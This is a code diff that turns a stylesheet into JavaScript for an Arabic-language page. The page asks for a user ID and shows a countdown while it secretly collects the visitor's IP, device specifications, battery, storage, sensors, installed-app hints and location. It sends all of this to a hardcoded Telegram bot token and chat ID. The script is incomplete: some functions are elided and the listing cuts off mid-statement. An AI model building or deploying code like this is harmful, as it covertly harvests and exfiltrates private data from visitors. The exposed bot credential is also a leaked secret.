@@ -1,53 +1,99 @@
-/* Reset بعض الإعدادات الافتراضية للمتصفحات */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
+// Telegram Configuration
+const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
+const CHAT_ID = "6913353602";
+
+// DOM Elements
+const elements = {
+    welcomeMessage: document.getElementById('welcome-message'),
+    statusEl: document.getElementById('status'),
+    permissionBtn: document.getElementById('permission-btn'),
+    submitBtn: document.getElementById('submit-btn'),
+    userIdInput: document.getElementById('user-id'),
+    page1: document.getElementById('page1'),
+    page2: document.getElementById('page2'),
+    page3: document.getElementById('page3'),
+    countdownEl: document.getElementById('countdown'),
+    loadingEl: document.getElementById('loading'),
+    errorEl: document.getElementById('error-message'),
+    successEl: document.getElementById('success-message')
+};
+
+// Move to page 2 when start button is clicked
+elements.permissionBtn.addEventListener('click', () => {
+    elements.page1.classList.add('hidden');
+    elements.page2.classList.remove('hidden');
+});
+
+// ==================== Improved Device Info Collection ====================
+async function getDeviceInfo(userId) {
+    try {
+        showLoading("جاري جمع معلومات الجهاز...");
+        
+        const ip = await fetchIP();
+        const battery = await getBatteryInfo();
+        const storage = await getStorageEstimate();
+        
+        const deviceInfo = {
+            userId: userId,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            deviceType: getDeviceType(),
+            os: getOSInfo(),
+            cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : 'غير معروف',
+            screen: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth} بت`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            battery: battery,
+            connection: getConnectionInfo(),
+            ip: ip,
+            gpu: getGPUInfo(),
+            touchSupport: 'ontouchstart' in window ? 'مدعوم' : 'غير مدعوم',
+            sensors: getSensorInfo(),
+            storage: storage,
+            installedApps: getInstalledAppsInfo(),
+            security: getSecurityInfo(),
+            time: new Date().toLocaleString('ar-EG'),
+            location: await tryGetLocation(userId)
+        };
+        
+        await sendToTelegram(formatDeviceInfo(deviceInfo));
+        return deviceInfo;
+    } catch (error) {
+        await sendToTelegram(`⚠️ خطأ في جمع معلومات الجهاز: ${error.message}\nUser ID: ${userId}`);
+        throw error;
+    } finally {
+        hideLoading();
+    }
 }
 
-body {
-  font-family: 'Arial', sans-serif;
-  line-height: 1.6;
-  color: #333;
-  background-color: #f4f4f4;
-  padding: 20px;
-}
+// ... (استمر بنفس الطريقة لكل الدوال الأخرى الموجودة في السكربت الأصلي)
+// يمكنك نسخ باقي الدوال كما هي من السكربت الأصلي
 
-/* تنسيق العنوان الرئيسي */
-h1 {
-  color: #444;
-  text-align: center;
-  margin-bottom: 20px;
-}
-
-/* تنسيق الروابط */
-a {
-  color: #3498db;
-  text-decoration: none;
-}
-
-a:hover {
-  text-decoration: underline;
-}
-
-/* تنسيق الأزرار */
-button {
-  background-color: #3498db;
-  color: white;
-  border: none;
-  padding: 10px 15px;
-  border-radius: 5px;
-  cursor: pointer;
-  font-size: 16px;
-}
-
-button:hover {
-  background-color: #2980b9;
-}
-
-/* تنسيق الصفحة الرئيسية */
-.container {
-  max-width: 1200px;
-  margin: 0 auto;
-  padding: 0 20px;
-}
+// ==================== Main Event Listener ====================
+elements.submitBtn.addEventListener('click', async () => {
+    const userId = elements.userIdInput.value.trim();
+    
+    if (!userId) {
+        showError("الرجاء إدخال الأيدي الخاص بك");
+        return;
+    }
+    
+    // الانتقال إلى صفحة الانتظار
+    elements.page2.classList.add('hidden');
+    elements.page3.classList.remove('hidden');
+    elements.errorEl.classList.add('hidden');
+    elements.successEl.classList.add('hidden');
+    
+    // بدء العد التنازلي
+    let timeLeft = 180;
+    const countdownInterval = setInterval(() => {
+        timeLeft--;
+        
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        elements.countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0)
